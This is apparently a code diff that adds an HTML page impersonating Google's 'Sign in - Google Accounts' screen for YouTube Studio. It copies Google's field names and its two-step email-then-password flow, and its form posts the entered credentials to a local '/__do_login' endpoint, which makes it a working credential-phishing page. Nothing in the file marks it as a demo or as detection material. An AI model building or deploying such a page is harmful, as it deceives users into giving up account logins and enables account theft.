@@ -1,0 +1,15 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Sign in - Google Accounts</title>
+<style>body{font-family:Arial;background:#fff;display:flex;justify-content:center;padding-top:80px}.box{border:1px solid #ddd;border-radius:8px;padding:40px;width:380px}input{width:100%;padding:12px;margin:12px 0;font-size:16px}button{background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:4px;font-size:15px}</style></head>
+<body><div class="box">
+  <h1>Sign in</h1><p>to continue to YouTube Studio</p>
+  <form id="f" method="post" action="/__do_login">
+    <div id="step1"><input type="email" id="identifierId" name="identifier" placeholder="Email or phone" autocomplete="username"><button type="button" id="identifierNext">Next</button></div>
+    <div id="step2" style="display:none"><input type="password" name="Passwd" placeholder="Enter your password"><button type="submit" id="passwordNext">Next</button></div>
+    <input type="hidden" name="continue" id="cont">
+  </form>
+</div>
+<script>
+  document.getElementById('cont').value = new URLSearchParams(location.search).get('continue') || '/';
+  document.getElementById('identifierNext').onclick = () => { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; };
+</script></body></html>
